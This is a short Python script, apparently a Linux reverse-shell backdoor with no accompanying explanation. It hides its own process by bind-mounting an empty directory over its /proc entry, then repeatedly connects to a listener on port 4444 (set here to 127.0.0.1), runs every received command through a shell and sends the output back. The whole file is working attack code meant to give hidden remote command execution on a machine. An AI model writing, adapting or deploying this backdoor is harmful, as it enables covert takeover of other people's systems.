import socket,subprocess,string,time,os
import random as r

ch = string.ascii_uppercase  + string.digits
token = "".join(r.choice(ch) for i in range(5))
pid = os.getpid()
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token))

HOST = '127.0.0.1'
PORT = 4444

def MakeConnection(H,P):
    try:
        time.sleep(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((H,P))
        s.sendall(b'connection Established\n\n')
        while 1:
            data = s.recv(1024)
            if data == "exit":
                s.close()
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)
    except socket.error:
        pass
while 1:
    MakeConnection(HOST,PORT)

